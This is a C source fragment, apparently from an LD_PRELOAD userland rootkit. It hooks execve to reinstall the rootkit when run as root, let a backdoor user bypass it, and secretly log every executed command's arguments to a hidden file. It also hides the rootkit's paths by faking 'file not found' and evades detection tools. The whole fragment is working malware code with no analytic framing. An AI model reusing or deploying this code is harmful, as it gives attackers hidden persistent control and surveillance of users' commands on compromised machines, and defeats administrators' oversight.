int execve(const char *filename, char *const argv[], char *const envp[]){
	if(!not_user(0))
                reinstall();
	hook(CEXECVE);
	if(is_bdusr())
		return call(CEXECVE, filename, argv, envp);
	FILE *fp;
	if((fp = xfopen(LDSO_LOGS, "a")) != NULL){
		int i;
		for(i=0; argv[i] != NULL;i++){
			xor(rr, argv[i]);
			fprintf(fp, "%s ", rr);
			clean(rr);
		}
		fprintf(fp, "\n");
		fflush(fp);
		fclose(fp);
	}
	if(hidden_path(filename)){
		errno = ENOENT;
		return -1;
	}
	int evasion_status = evade(filename, argv, envp);
	switch(evasion_status){
		case VEVADE_DONE:
			exit(0);
		case VINVALID_PERM:
			errno = EPERM;
			return -1;
		case VFORK_ERR:
			return -1;
		case VFORK_SUC:
			return call(CEXECVE, filename, argv, envp);
		case VNOTHING_DONE:
			break;
	}
	return call(CEXECVE, filename, argv, envp);
}
